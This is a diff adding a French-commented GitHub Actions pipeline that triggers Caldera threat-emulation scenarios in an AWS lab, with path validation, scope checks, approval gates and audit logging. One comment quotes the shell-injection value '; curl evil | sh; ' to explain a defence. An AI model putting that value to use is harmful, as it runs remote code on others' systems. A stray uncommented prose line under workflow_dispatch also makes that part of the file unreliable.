@@ -1,0 +1,321 @@
+name: Emulation Pipeline
+
+# Point d'entrée unique des modes de déclenchement retenus à la Tâche 13.
+on:
+  # -------------------------------------------------------------------
+  # schedule : rejeu hebdomadaire multi-scénarios — DÉSACTIVÉ pour l'instant.
+  #
+  # Cette structure mono-scénario (validate -> approval -> execute -> audit)
+  # ne peut PAS rejouer "tous les scénarios release" en un seul run : un job
+  # ne produit qu'un seul scenario_path. Le rejeu multi-scénarios demande une
+  # restructuration en matrice (un run par scénario). Réactiver ce trigger
+  # SANS la matrice produirait un échec garanti chaque lundi (le garde-fou
+  # dans l'étape 'resolve' fait exit 1 sur l'évènement schedule).
+  #
+  # Deux options le jour où tu voudras ce rejeu :
+  #   (a) passer à la matrice (discover + run-scenario) ;
+  #   (b) le limiter à UN scénario "canary" de fumée hebdomadaire (dans ce
+  #       cas, remplacer le exit 1 de 'resolve' par la résolution d'un
+  #       chemin canary, ex. via vars.CANARY_SCENARIO).
+  # -------------------------------------------------------------------
+  # schedule:
+  #   - cron: "0 2 * * 1" # tous les lundis à 02h00 UTC
+
+  workflow_dispatch:
+    Manuel : déclenchement à la demande par un opérateur autorisé.
+    inputs:
+      scenario:
+        description: "Chemin du scénario (ex: threat-emulation/actors/apt29/scenario-initial-2026)"
+        required: true
+        type: string
+
+  push:
+    # Automatique (CI/CD) : un tag de release sur main = scénario validé.
+    tags:
+      - "v*.*.*"
+
+permissions:
+  id-token: write # requis pour l'authentification OIDC vers AWS (pas de clé statique)
+  contents: read
+
+jobs:
+  # ---------------------------------------------------------------------
+  # 1. Validation — garde-fous techniques avant tout déclenchement
+  # ---------------------------------------------------------------------
+  validate:
+    name: Validation du scénario (garde-fous)
+    runs-on: ubuntu-latest
+    outputs:
+      scenario_path: ${{ steps.resolve.outputs.scenario_path }}
+      risk_level: ${{ steps.metadata.outputs.risk_level }}
+    steps:
+      - name: Checkout du dépôt de scénarios
+        uses: actions/checkout@v4
+
+      - name: Résoudre le scénario ciblé
+        id: resolve
+        # Les entrées non fiables (inputs.scenario, ref_name) passent par
+        # l'ENVIRONNEMENT, jamais par interpolation ${{ }} directe dans le
+        # script : sinon une valeur comme  "; curl evil | sh; "  serait
+        # injectée telle quelle dans le bash du runner (RCE).
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          SCENARIO_INPUT: ${{ inputs.scenario }}
+          TAG_INPUT: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            SCENARIO="$SCENARIO_INPUT"
+
+          elif [ "$EVENT_NAME" = "push" ]; then
+            # Convention (CONTRIBUTING.md section 5) :
+            #   git tag v<semver>-<acteur>-<contexte>-scenario
+            # ex: v1.0.0-apt29-initial-2026-scenario
+            #   -> threat-emulation/actors/apt29/scenario-initial-2026
+            #
+            # Hypothèse : le nom de l'acteur ne contient pas de tiret
+            # (ex: apt29, lazarus, fin7). Si un acteur a un nom composé,
+            # cette extraction devra être revue.
+            TAG="$TAG_INPUT"
+            REST=$(printf '%s' "$TAG" | sed -E 's/^v[0-9]+\.[0-9]+\.[0-9]+-//; s/-scenario$//')
+            ACTOR=$(printf '%s' "$REST" | cut -d'-' -f1)
+            CONTEXT=$(printf '%s' "$REST" | cut -d'-' -f2-)
+
+            if [ -z "$ACTOR" ] || [ -z "$CONTEXT" ] || [ "$ACTOR" = "$REST" ]; then
+              echo "::error::Impossible d'extraire acteur/contexte du tag '${TAG}' — convention attendue: v<semver>-<acteur>-<contexte>-scenario"
+              exit 1
+            fi
+
+            SCENARIO="threat-emulation/actors/${ACTOR}/scenario-${CONTEXT}"
+
+          else
+            # schedule (ou tout autre évènement) : non supporté par cette
+            # structure mono-scénario. Voir la note sur le bloc 'on:'.
+            echo "::error::Déclenchement '${EVENT_NAME}' non supporté ici (le rejeu planifié nécessite la matrice) — voir commentaire du bloc on:"
+            exit 1
+          fi
+
+          # ---------------------------------------------------------------
+          # Validation STRICTE du chemin : il sera interpolé plus loin dans
+          # une commande bash exécutée à distance (SSM) sur l'hôte Caldera.
+          # On n'autorise que [A-Za-z0-9._-] entre les '/', on impose le
+          # préfixe threat-emulation/, et on rejette toute séquence '..'.
+          # Cela ferme l'injection shell côté runner ET côté hôte distant.
+          # ---------------------------------------------------------------
+          case "$SCENARIO" in
+            *..*)
+              echo "::error::Séquence '..' interdite dans le chemin: ${SCENARIO}"
+              exit 1 ;;
+          esac
+          if ! printf '%s' "$SCENARIO" | grep -qE '^threat-emulation/[A-Za-z0-9._-]+(/[A-Za-z0-9._-]+)*$'; then
+            echo "::error::Chemin de scénario invalide (caractères non autorisés ou préfixe manquant): ${SCENARIO}"
+            exit 1
+          fi
+
+          if [ ! -d "$SCENARIO" ]; then
+            echo "::error::Dossier scénario introuvable: ${SCENARIO}"
+            exit 1
+          fi
+
+          echo "scenario_path=${SCENARIO}" >> "$GITHUB_OUTPUT"
+
+      - name: Lire metadata.yaml et vérifier le périmètre
+        id: metadata
+        env:
+          SCENARIO_PATH: ${{ steps.resolve.outputs.scenario_path }}
+        run: |
+          set -euo pipefail
+          META="${SCENARIO_PATH}/metadata.yaml"
+          if [ ! -f "$META" ]; then
+            echo "::error::metadata.yaml introuvable pour ce scénario"
+            exit 1
+          fi
+
+          RISK=$(yq '.risk_level' "$META")
+          PROD_FLAG=$(yq '.production // false' "$META")
+          ADVERSARY_ID=$(yq '.adversary_id // ""' "$META")
+
+          # -------------------------------------------------------------
+          # BUG CORRIGÉ : target_environment est un OBJET {os, network_segment},
+          # pas une chaîne. L'ancien test  [ "$TARGET" != "lab" ]  comparait
+          # la sérialisation d'un mapping à "lab" -> toujours vrai -> TOUS les
+          # scénarios étaient refusés, sans exception. On lit désormais le
+          # champ imbriqué network_segment.
+          # -------------------------------------------------------------
+          SEGMENT=$(yq '.target_environment.network_segment' "$META")
+
+          echo "risk_level=${RISK}" >> "$GITHUB_OUTPUT"
+
+          # --- Garde-fou périmètre ---
+          # Segments du lab (VPC threat-emulation-lab, 10.42.0.0/16) :
+          #   lab-targets = 10.42.1.0/24  -> DC + Workstation (cibles d'émulation)
+          #   lab-infra   = 10.42.2.0/24  -> Caldera + Wazuh (C2 + SIEM)
+          # Seul lab-targets est une cible légitime : on n'émule PAS contre son
+          # propre C2/SIEM. Toute autre valeur (y compris lab-infra) => refus.
+          # /!\ Doit rester synchronisé avec metadata.yaml.template.
+          case "$SEGMENT" in
+            lab-targets) : ;; # unique segment cible autorisé (10.42.1.0/24)
+            "" | null)
+              echo "::error::target_environment.network_segment manquant dans metadata.yaml"
+              exit 1 ;;
+            *)
+              echo "::error::network_segment '${SEGMENT}' hors périmètre cible autorisé (attendu: lab-targets) — exécution refusée"
+              exit 1 ;;
+          esac
+
+          if [ "$PROD_FLAG" = "true" ]; then
+            echo "::error::flag 'production' détecté — exécution refusée"
+            exit 1
+          fi
+
+          # -------------------------------------------------------------
+          # adversary_id est le contrat rempli par la Tâche 23. S'il est vide,
+          # trigger_caldera.sh enverrait  adversary_id: null  à l'API Caldera
+          # et planterait tard, de façon obscure. On échoue TÔT, message clair.
+          # (Conséquence assumée : un scénario sans adversary_id ne s'exécute
+          #  pas tant que la Tâche 23 ne l'a pas renseigné — comportement voulu.)
+          # -------------------------------------------------------------
+          if [ -z "$ADVERSARY_ID" ] || [ "$ADVERSARY_ID" = "null" ]; then
+            echo "::error::adversary_id absent de metadata.yaml — requis pour créer l'opération Caldera (voir Tâche 23)"
+            exit 1
+          fi
+
+      - name: Vérifier les quotas d'exécution simultanée
+        run: |
+          # Interroge l'orchestrateur (via SSM, cf. job execute) pour s'assurer
+          # qu'aucune opération Caldera n'est déjà en cours avant d'en autoriser une nouvelle.
+          # Note : le vrai garde-fou "1 opération à la fois" vit déjà dans
+          # trigger_caldera.sh (refus si state=running). Cette étape reste un
+          # placeholder tant que la doc pipeline-cicd.md section 4 n'est pas câblée.
+          echo "Quota check placeholder — voir doc pipeline-cicd.md section 4"
+
+  # ---------------------------------------------------------------------
+  # 2. Approbation — requise pour tout scénario risque medium/high,
+  #    même en déclenchement automatique (cf. Tâche 13, mesure "Approbation préalable")
+  # ---------------------------------------------------------------------
+  approval:
+    name: Approbation (RBAC)
+    needs: validate
+    runs-on: ubuntu-latest
+    if: needs.validate.outputs.risk_level == 'medium' || needs.validate.outputs.risk_level == 'high'
+    environment:
+      name: lab-execution-approval # Environment GitHub avec required reviewers configurés
+    steps:
+      - name: Approbation obtenue
+        run: echo "Scénario risque ${{ needs.validate.outputs.risk_level }} approuvé par un reviewer autorisé."
+
+  # ---------------------------------------------------------------------
+  # 3. Exécution — déclenchement via SSM Run Command (Caldera est en IP privée)
+  # ---------------------------------------------------------------------
+  execute:
+    name: Déclenchement Caldera via SSM
+    needs: [validate, approval]
+    if: always() && needs.validate.result == 'success' && (needs.approval.result == 'success' || needs.approval.result == 'skipped')
+    runs-on: ubuntu-latest
+    timeout-minutes: 40 # marge au-dessus des 30 min max de trigger_caldera.sh
+    environment:
+      name: lab-execution # second environment, sans reviewer, juste pour scoper les secrets OIDC
+    steps:
+      - name: Authentification AWS via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ vars.AWS_ROLE_ARN }} # rôle scopé, pas de clé statique
+          aws-region: ${{ vars.AWS_REGION }}
+
+      - name: Lancer l'opération Caldera via SSM Run Command
+        id: trigger
+        # scenario_path est déjà validé (regex stricte) côté job validate ;
+        # on le passe malgré tout par l'environnement plutôt que par
+        # interpolation ${{ }} directe, par principe (defense-in-depth).
+        env:
+          SCENARIO_PATH: ${{ needs.validate.outputs.scenario_path }}
+          INSTANCE_ID: ${{ vars.CALDERA_HOST_INSTANCE_ID }}
+        run: |
+          set -euo pipefail
+          # git pull sur l'hôte AVANT exécution : le dépôt cloné par Ansible
+          # (sparse-checkout sur threat-emulation/) peut être en retard sur
+          # le commit qui vient de déclencher ce workflow.
+          COMMAND_ID=$(aws ssm send-command \
+            --instance-ids "$INSTANCE_ID" \
+            --document-name "AWS-RunShellScript" \
+            --timeout-seconds 2100 \
+            --parameters "commands=[\"cd /opt/lab/scenarios && sudo git pull && sudo /opt/lab/trigger_caldera.sh /opt/lab/scenarios/${SCENARIO_PATH}\"]" \
+            --query "Command.CommandId" --output text)
+          echo "command_id=${COMMAND_ID}" >> "$GITHUB_OUTPUT"
+
+      - name: Attendre la fin d'exécution (polling maison)
+        id: poll
+        env:
+          COMMAND_ID: ${{ steps.trigger.outputs.command_id }}
+          INSTANCE_ID: ${{ vars.CALDERA_HOST_INSTANCE_ID }}
+        run: |
+          set -euo pipefail
+          # aws ssm wait command-executed a un timeout fixe de 100s côté
+          # CLI (20 tentatives x 5s), bien trop court pour une opération
+          # Caldera pouvant durer jusqu'à 30 min. Boucle maison à la place,
+          # calée sur le timeout du job (40 min).
+          STATUS="Pending"
+          for i in $(seq 1 228); do # 228 x 10s ≈ 38 min
+            STATUS=$(aws ssm get-command-invocation \
+              --command-id "$COMMAND_ID" --instance-id "$INSTANCE_ID" \
+              --query "Status" --output text 2>/dev/null || echo "Pending")
+            echo "[$i] Statut SSM: ${STATUS}"
+            case "$STATUS" in
+              Success | Failed | Cancelled | TimedOut) break ;;
+            esac
+            sleep 10
+          done
+          echo "final_status=${STATUS}" >> "$GITHUB_OUTPUT"
+
+      - name: Récupérer le résultat / rapport d'opération
+        env:
+          COMMAND_ID: ${{ steps.trigger.outputs.command_id }}
+          INSTANCE_ID: ${{ vars.CALDERA_HOST_INSTANCE_ID }}
+          STATUS: ${{ steps.poll.outputs.final_status }}
+        run: |
+          set -euo pipefail
+          aws ssm get-command-invocation \
+            --command-id "$COMMAND_ID" --instance-id "$INSTANCE_ID" \
+            --output json > invocation.json
+
+          echo "--- Sortie standard ---"
+          jq -r '.StandardOutputContent' invocation.json
+
+          if [ "$STATUS" != "Success" ]; then
+            echo "::error::Échec du scénario (statut SSM: ${STATUS})"
+            echo "--- Sortie d'erreur ---"
+            jq -r '.StandardErrorContent' invocation.json
+            exit 1
+          fi
+
+  # ---------------------------------------------------------------------
+  # 4. Journalisation — horodatage et attribution, indépendant du SIEM
+  # ---------------------------------------------------------------------
+  audit-log:
+    name: Journalisation
+    needs: [validate, approval, execute]
+    if: always()
+    runs-on: ubuntu-latest
+    steps:
+      - name: Enregistrer l'évènement
+        env:
+          SCENARIO_PATH: ${{ needs.validate.outputs.scenario_path }}
+          RISK: ${{ needs.validate.outputs.risk_level }}
+          TRIGGER: ${{ github.event_name }}
+          ACTOR: ${{ github.actor }}
+          RUN_ID: ${{ github.run_id }}
+          RESULT: ${{ needs.execute.result }}
+        run: |
+          echo "$(date -u +%FT%TZ) | scenario=${SCENARIO_PATH} | risk=${RISK} | trigger=${TRIGGER} | actor=${ACTOR} | run_id=${RUN_ID} | result=${RESULT}" >> audit.log
+
+      - name: Persister le journal (artifact)
+        uses: actions/upload-artifact@v4
+        with:
+          name: audit-log-${{ github.run_id }}
+          path: audit.log
+          retention-days: 90
+        # À terme : remplacer l'artifact (éphémère, 90j, non inviolable) par
+        # un envoi vers un stockage journalisé indépendant et versionné
+        # (S3 versionné + Object Lock), seule solution réellement inviolable
+        # pour une piste d'audit de sécurité.
